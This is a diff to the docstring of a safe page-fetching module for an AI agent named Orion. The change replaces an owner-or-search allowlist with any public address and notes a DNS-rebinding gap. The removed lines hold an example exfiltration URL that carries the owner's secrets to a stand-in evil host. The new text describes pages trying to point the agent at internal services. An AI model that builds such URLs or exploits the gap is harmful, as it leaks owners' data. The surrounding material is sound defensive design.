@@ -1,9 +1,9 @@
 """Fetching a page safely: public addresses only, bounded size, text extracted by code.
 
-A page is fetched only at an address the owner gave or a search returned (`WebState.allowed`):
-a URL is also a way to send data out (`https://evil.example/?q=<the owner's secrets>`), so the
-model never gets to make one up. Private, loopback and link-local addresses are refused, on
-every redirect, so a page cannot point Orion at the guardian or the local network.
+Any public address (D115). Private, loopback and link-local addresses are refused, on every
+redirect, so a page cannot point Orion at the guardian or the local network. The address is
+resolved for the check, then again by the HTTP client: a host that changes its answer between
+the two (DNS rebinding) is not caught here.
 """
 
 from __future__ import annotations
